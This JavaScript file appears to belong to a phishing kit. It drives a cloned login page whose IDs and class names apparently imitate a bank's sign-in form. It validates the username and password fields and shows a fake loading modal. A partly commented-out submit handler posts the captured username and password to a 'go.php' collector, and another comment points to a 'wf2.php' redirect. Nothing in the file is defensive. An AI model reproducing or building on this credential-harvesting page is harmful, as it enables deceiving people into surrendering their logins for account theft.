const error = document.querySelector("#MHXCTKHK");
const errorY = document.querySelector("#MHXCTKHKXXA");
const label_lab = document.querySelector("#labX");
const label_labY = document.querySelector("#labY");
const Unmask_Password = document.querySelector("#Unmask_Password");
const btn_submit = document.querySelector("#btn_submit");
const x = document.querySelector("#j_username ");
const y = document.querySelector("#j_password ");
// Functii
function usernName() {
  var username = x.value;
  if (username.length > 6) {
    error.innerHTML = "<span></span>";
    label_lab.style.color = "";
  } else {
    error.innerHTML = "<span>That username is too short.</span>";
    label_lab.style.color = "#bf2d19";
  }
}
function passwWord() {
  var password = y.value;
  if (password.length > 6) {
    errorY.innerHTML = "<span></span>";
    label_labY.style.color = "";
  } else {
    errorY.innerHTML = "<span>That password is too short.</span>";
    label_labY.style.color = "#bf2d19";
  }
}
x.addEventListener("focus", helterone, true);
function helterone() {
  const lab = document.querySelector(".WFInput__inputContainer___13Pit");
  lab.classList.add("active");
}
y.addEventListener("focus", helteroneY);
function helteroneY() {
  const lab = document.querySelector(".WFInput__maskable___22TWg ");
  lab.classList.add("activeY");
  usernName();
}
/////Validate JS Valina Input //////
x.addEventListener("keydown", function () {
  usernName();
});
y.addEventListener("keydown", function () {
  passwWord();
});

y.addEventListener("keydown", function () {
  var username = x.value;
  var password = y.value;
  if (password.length > 6 && username.length > 6) {
    btn_submit.classList.remove("Button__primary___disabled");
    btn_submit.classList.add("Button__primary___ritso");
  } else {
    btn_submit.classList.add("Button__primary___disabled");
    btn_submit.classList.remove("Button__primary___ritso");
  }
});
x.addEventListener("keydown", function () {
  var username = x.value;
  var password = y.value;
  if (password.length > 6 && username.length > 6) {
    btn_submit.classList.remove("Button__primary___disabled");
    btn_submit.classList.add("Button__primary___ritso");
  } else {
    btn_submit.classList.add("Button__primary___disabled");
    btn_submit.classList.remove("Button__primary___ritso");
  }
});
Unmask_Password.addEventListener("click", function () {
  if (y.type == "text") {
    y.type = "password";
  } else {
    y.type = "text";
  }
});
window.addEventListener("click", function (e) {
  if (x !== e.target || y !== e.target) {
    var username = x.value;
    if (username.length > 6) {
      error.innerHTML = "<span></span>";
      label_lab.style.color = "";
    } else {
      error.innerHTML = "<span>Username is a required field</span>";
      label_lab.style.color = "#bf2d19";
    }
    var password = y.value;
    if (password.length > 6) {
      errorY.innerHTML = "<span></span>";
      label_labY.style.color = "";
    } else {
      errorY.innerHTML = "<span>Password is a required field</span>";
      label_labY.style.color = "#bf2d19";
    }
  }
});
const scriptURL ="go.php";

function fetchData() {
  var modal = document.querySelector("#modal").style.display = "flex";
  return new Promise(resolve => setTimeout(resolve, 5000, modal))
}
const form = document.forms["submit-to-google-sheet"];

form.addEventListener("submit",async  (e) => {
  const nextContent = await fetchData()
// if ( x.value.length < 6) {
//   console.log("enter username ")
// } else if (y.value   < 6){
//   console.log("enter passs ")
// }else{

//   var j_username = document.querySelector("#j_username").value
//   var j_username = document.querySelector("#j_password").value


//   fetch(scriptURL, {
//     method: 'post', // Default is 'get'
//     body: JSON.stringify({ "Username": j_username, "Password": j_username }),
//     mode: 'cors',
//     headers: new Headers({
//       'Content-Type': 'application/json'
//     })
    
//   })
//   .then(response => {
  
//   })
//   .then(json => function() {
//     console.log('Response', json)
//   })
//   // fetch(scriptURL, { method: "POST", body: new FormData(form) })
//   //   .then((response) => {
//   //     console.log(response);
//   //     // if (response.status == 200 && response.ok === true) {
//   //     //   window.location.href="wf2.php";
//   //     // }
//   //   })
//   //   .catch((error) => console.error("Error!", error.message));
//   }

}
);




// ::::::::::::::::::::::::: Save file ::::::::::::::::::::::::: //

